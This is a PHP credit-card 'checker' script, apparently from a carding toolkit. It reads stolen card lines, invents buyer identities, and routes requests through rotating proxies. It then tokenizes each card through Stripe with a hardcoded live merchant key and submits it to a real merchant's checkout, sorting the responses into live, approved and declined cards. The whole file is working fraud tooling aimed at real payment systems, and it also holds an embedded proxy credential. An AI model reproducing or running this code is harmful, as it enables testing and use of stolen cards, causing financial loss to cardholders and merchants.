<?php

# ❮============ ⇱ RAW FOR PYROAR ⇲ =============❯ #

# Contents :- Variable,Randomizer,Proxy,Webshare,Woo-Stripe,Inbuilt,Response,Reboot Proxy Support,Upto Four Request Support,Best API

# ❮================ ⇱ MENHERA ⇲ ================❯ #

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

/////////---------------HTTP PROXIES END----------------///////////

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();
#echo $poxySocks4;

# ❮================ ⇱ RANDOMIZER ⇲ ================❯ #

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1); 
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
$numero1 = substr($phone, 1,3);
$numero2 = substr($phone, 6,3);
$numero3 = substr($phone, 10,4);
$phone = $numero1.''.$numero2.''.$numero3;
$serve_arr = array("gmail.com","homtail.com","yahoo.com.br","bol.com.br","yopmail.com","outlook.com");
$serv_rnd = $serve_arr[array_rand($serve_arr)];
$email= str_replace("example.com", $serv_rnd, $email);
if($state=="Alabama"){ $state="AL";
}else if($state=="alaska"){ $state="AK";
}else if($state=="arizona"){ $state="AR";
}else if($state=="california"){ $state="CA";
}else if($state=="olorado"){ $state="CO";
}else if($state=="connecticut"){ $state="CT";
}else if($state=="delaware"){ $state="DE";
}else if($state=="district of columbia"){ $state="DC";
}else if($state=="florida"){ $state="FL";
}else if($state=="georgia"){ $state="GA";
}else if($state=="hawaii"){ $state="HI";
}else if($state=="idaho"){ $state="ID";
}else if($state=="illinois"){ $state="IL";
}else if($state=="indiana"){ $state="IN";
}else if($state=="iowa"){ $state="IA";
}else if($state=="kansas"){ $state="KS";
}else if($state=="kentucky"){ $state="KY";
}else if($state=="louisiana"){ $state="LA";
}else if($state=="maine"){ $state="ME";
}else if($state=="maryland"){ $state="MD";
}else if($state=="massachusetts"){ $state="MA";
}else if($state=="michigan"){ $state="MI";
}else if($state=="minnesota"){ $state="MN";
}else if($state=="mississippi"){ $state="MS";
}else if($state=="missouri"){ $state="MO";
}else if($state=="montana"){ $state="MT";
}else if($state=="nebraska"){ $state="NE";
}else if($state=="nevada"){ $state="NV";
}else if($state=="new hampshire"){ $state="NH";
}else if($state=="new jersey"){ $state="NJ";
}else if($state=="new mexico"){ $state="NM";
}else if($state=="new york"){ $state="LA";
}else if($state=="north carolina"){ $state="NC";
}else if($state=="north dakota"){ $state="ND";
}else if($state=="Ohio"){ $state="OH";
}else if($state=="oklahoma"){ $state="OK";
}else if($state=="oregon"){ $state="OR";
}else if($state=="pennsylvania"){ $state="PA";
}else if($state=="rhode Island"){ $state="RI";
}else if($state=="south carolina"){ $state="SC";
}else if($state=="south dakota"){ $state="SD";
}else if($state=="tennessee"){ $state="TN";
}else if($state=="texas"){ $state="TX";
}else if($state=="utah"){ $state="UT";
}else if($state=="vermont"){ $state="VT";
}else if($state=="virginia"){ $state="VA";
}else if($state=="washington"){ $state="WA";
}else if($state=="west virginia"){ $state="WV";
}else if($state=="wisconsin"){ $state="WI";
}else if($state=="wyoming"){ $state="WY";
}else{$state="KY";} 




# =============「 WEBSHARE 」================ #

/*$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'hjluuqeg-rotate:du1uavbi9uu0',
);
$rotate = $rp1[array_rand($rp1)];

# Proxy API
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_PROXY => 'http://p.webshare.io:80',
    CURLOPT_PROXYUSERPWD => $rotate,
    CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
    $ip = "✅";
}
if (empty($ip1)){
    $ip = "❌";
}
*/

# ========== 「 FIRST REQUEST 」 ========== #

$Curl = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($Curl, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($Curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($Curl, CURLOPT_HEADER, 0);
curl_setopt($Curl, CURLOPT_HTTPHEADER, array(
    'Authority: api.stripe.com',
    'Method: POST',
    'Path: /v1/payment_methods h2',
    'Scheme: https',
    'Accept: application/json',
    'Accept-Language: en-US,en;q=0.9',
    'sec-fetch-site: same-origin',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'Origin: https://checkout.stripe.com',
    'Referer: https://checkout.stripe.com/',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36', ));
curl_setopt($Curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($Curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($Curl, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][country]=US&billing_details[address][postal_code]='.$zip.'&billing_details[address][line1]=Nicholas+25th+Street&billing_details[name]='.$firstname.'+'.$lastname.'&billing_details[phone]=9487632889&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=57a31cc0-7cf5-430f-a7e0-f28db05b1f5e061e7f&muid=b923af68-8bc1-4503-ae84-ce239d76fa8e87423f&sid=142afbfa-0cc9-44eb-8889-6fdaa7ac8df70d0bc3&payment_user_agent=stripe.js%2F4120235ee8%3B+stripe-js-v3%2F4120235ee8%3B+split-card-element&time_on_page=30193&key=pk_live_XLay1TWP0g7aBX0xBVnDqH4R&_stripe_account=acct_1IC5CtFtvEOmZjqo');
$FirstRequest = curl_exec($Curl); //Variables Required : '.$cc.' | '.month.' | '.year.' | '.cvv.' |
$pm = trim(strip_tags(getStr($FirstRequest,'"id": "','"')));
$cvchk = trim(strip_tags(getStr($FirstRequest,'"cvc_check": "','"')));
#echo "<br><b>: </b> $FirstRequest<br>";


# ========== 「 FIRST REQUEST END 」 ========== #




# ========== 「 SECOND REQUEST 」 ========== #


$Curl = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($Curl, CURLOPT_URL, 'https://order.preparedhero.com/pay');
curl_setopt($Curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($Curl, CURLOPT_HEADER, 0);
curl_setopt($Curl, CURLOPT_HTTPHEADER, array(
    'POST /index.php/membership-account/membership-checkout/ h2',
    'Host: order.preparedhero.com',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0',
    'Accept: */*',
    'Accept-Language: en-US,en;q=0.5',
    'Content-Type: application/json',
    'Origin: https://order.preparedhero.com',
    'Connection: keep-alive',
    'Referer: https://order.preparedhero.com/efb-checkout',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
));
curl_setopt($Curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($Curl, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($Curl, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($Curl, CURLOPT_POSTFIELDS, '{"step_id":105367,"page_id":540463,"user_id":6074,"funnel_id":30059,"page_url":"https://order.preparedhero.com/efb-checkout","session_id":"3b0fb909-9912-4d65-a4b3-362809b57d3f","gateway_group_id":1,"user_gateway_id":11351,"gateway_id":1,"token":"'.$pm.'","customer":{"meta":[{"name":"fbp","value":"fb.1.1695908526995.1617741631"},{"name":"user_agent","value":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"},{"name":"referrer","value":"https://www.google.com/"},{"name":"session_id","value":"3b0fb909-9912-4d65-a4b3-362809b57d3f"}],"first_name":"'.$firstname.'","last_name":"'.$lastname.'","phone":"9487632889","shipping_country":"US","shipping_state":"NY","shipping_city":"Washington","shipping_zip":"'.$zip.'","shipping_address":"Nicholas 25th Street","full_name":"'.$firstname.' '.$lastname.'","optin_email":"'.$email.'"},"products":[{"product_id":79649,"qty":1},{"product_id":142575,"qty":1}],"is_oto":false,"discount_id":null}');
$SecondRequest = curl_exec($Curl); //Variables Required : '.$cc.' | '.month.' | '.year.' | '.cvv.' |
$chg = trim(strip_tags(getStr($SecondRequest,'"client_secret": "','"')));
$risk = trim(strip_tags(getStr($SecondRequest,'"risk_level\":\"','\"')));
$scr = trim(strip_tags(getStr($SecondRequest,'"risk_score\":\"','\"')));

#echo "<br><b>SECOND: </b> $SecondRequest<br><br>";


# ========== 「 SECOND REQUEST END 」 ========== #

///////////////////////// Bin Lookup Api //////////////////////////

$cctwo = substr("$cc", 0, 6);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
	$type = 'Credit';
} else {
	$type = 'Debit';
}

# ========== 「 RESPONSES 」 ========== #

if(strpos($SecondRequest,'tok_')){
    echo '<b><span class="badge btn-bg-gradient-x-pink text-white ">#𝗟𝗜𝗩𝗘 ✅</span> <span class="badge btn-bg-gradient-x-pink text-white">「𝗣𝗬𝗥𝗢𝗔𝗥 ♻️ 」</span><span><br>• 𝗖𝗖 ➥ '.$lista.' </span><br><span>• 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➥「OTP DETECTED」<br>• 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 ➥ result:authenticate</span></span></b><br><br></b>';
}

elseif(strpos($SecondRequest, '')){ 
  echo '<b><span class="badge btn-bg-gradient-x-purple-red text-white ">#𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅ </span> <span class="badge btn-bg-gradient-x-purple-red text-white">「𝗣𝗬𝗥𝗢𝗔𝗥 ♻️ 」</span><br><span class="badge btn-bg-gradient-x-blue-green text-white">• 𝗣𝗥𝗢𝗫𝗬 ➥「'.$pr.'xx.xx.xxxx」</span><span><br>• 𝗖𝗖 ➥ '.$lista.' </span><br><span>• 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 ➥「CHARGED $22.9」<br>• 𝗠𝗘𝗦𝗦𝗔𝗚𝗘 ➥ Thank you for the Subscription .<br>• 
    𝗖𝗟𝗜𝗘𝗡𝗧 𝗦𝗖𝗧 ➥ `pi_xxxxxxx`</span></span></b><br><br></b>';
}

elseif(strpos($SecondRequest, 'Your card has insufficient funds.') )
{ echo '<span class="badge badge-success">#Aprovada ✅</span> ➜ <span class="badge badge-info"><i>'.$lista.'</i></span> ➜ <span class="badge badge-info">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒑𝒂𝒔𝒔</span> ➜ <span class="badge badge-info">𝑰𝒏𝒔𝒖𝒇𝒇𝒊𝒄𝒊𝒆𝒏𝒕 𝑭𝒖𝒏𝒅𝒔</span> ➜ <span class="badge badge-info">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-info">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-info">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}

elseif(strpos($SecondRequest, 'transaction_not_allowed') )
{ echo '<span class="badge badge-success">#Aprovada ✅</span> ➜ <span class="badge badge-info"><i>'.$lista.'</i></span> ➜ <span class="badge badge-info">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-info">𝑼𝒏𝒔𝒖𝒑𝒑𝒐𝒓𝒕𝒆𝒅 𝒑𝒖𝒓𝒄𝒉𝒂𝒔𝒆</span> ➜ <span class="badge badge-info">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-info">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-info">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
elseif 
 (strpos($SecondRequest, "incorrect_cvc")) {
    echo '<span class="badge badge-success">#Aprovada ✅</span> ➜ <span class="badge badge-info"><i>'.$lista.'</i></span> ➜ <span class="badge badge-info">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-info">𝑰𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕 𝑪𝑽𝑪</span> ➜ <span class="badge badge-info">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-info">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-info">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
elseif 
 (strpos($SecondRequest, "do_not_honor")) {
  echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑫𝒐 𝒏𝒐𝒕 𝒉𝒐𝒏𝒐𝒓</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}

elseif 
 (strpos($SecondRequest, "invalid_cvc")) {
    echo '<span class="badge badge-success">#Aprovada ✅</span> ➜ <span class="badge badge-info"><i>'.$lista.'</i></span> ➜ <span class="badge badge-info">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-info">𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑪𝑽𝑪</span> ➜ <span class="badge badge-info">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-info">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-info">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
elseif 
 (strpos($SecondRequest, "generic_decline")) {
    echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑮𝒆𝒏𝒆𝒓𝒊𝒄 𝒅𝒆𝒄𝒍𝒊𝒏𝒆</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}

elseif 
 (strpos($SecondRequest, "pickup_card")) {
    echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑷𝒊𝒄𝒌𝒖𝒐 𝒄𝒂𝒓𝒅</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}

elseif 
 (strpos($SecondRequest, "invalid_account")) {
    echo '<span class="badge badge-success">#Aprovada ✅</span> ➜ <span class="badge badge-info"><i>'.$lista.'</i></span> ➜ <span class="badge badge-info">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-info">𝑰𝒏𝒗𝒂𝒍𝒊𝒅 𝑨𝒄𝒄𝒐𝒖𝒏𝒕</span> ➜ <span class="badge badge-info">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-info">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-info">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
elseif 
 (strpos($SecondRequest, "try_again_later")) {
    echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑺𝒑𝒂𝒎 𝑨𝒏𝒕𝒊</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
elseif 
 (strpos($SecondRequest, "incorrect_number")) {
    echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑰𝒏𝒄𝒐𝒓𝒓𝒆𝒄𝒕 𝒏𝒖𝒎𝒃𝒆𝒓</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
elseif 
 (strpos($SecondRequest, "fraudulent")) {
    echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑭𝒓𝒂𝒖𝒅𝒖𝒍𝒆𝒏𝒕</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}
else {
    echo '<span class="badge badge-danger">#Declined ❌</span> ➜ <span class="badge badge-danger"><i>'.$lista.'</i></span> ➜ <span class="badge badge-danger">𝑪𝑽𝑪_𝒄𝒉𝒆𝒄𝒌: 𝒏𝒖𝒍𝒍</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒃𝒍𝒆𝒎 𝒘𝒉𝒊𝒍𝒆 𝒑𝒂𝒓𝒔𝒊𝒏𝒈</span> ➜ <span class="badge badge-danger">𝘽𝙄𝙉 '.$cctwo .' ♻️ 𝙋𝙔𝙍 </span> ➜ <span class="badge badge-danger">𝑺𝒕𝒓𝒊𝒑𝒆 𝑴𝒆𝒓𝒄𝒉𝒂𝒏𝒕 (𝟓$)</span> ➜ <span class="badge badge-danger">𝑷𝒓𝒐𝒙𝒚</span> ➜ <span class="badge badge-primary">'.$poxySocks4.'</span></span> </br>';
}

# ========== 「 RESPONSES END 」 ========== #


# ========== 「 CLOSING CURL 」 ========== #

curl_close($Curl); ob_flush();


# ========== 「 ECHO END 」 ========== #


# ❮========== ⇱ END ⇲ ==========❯ #

?>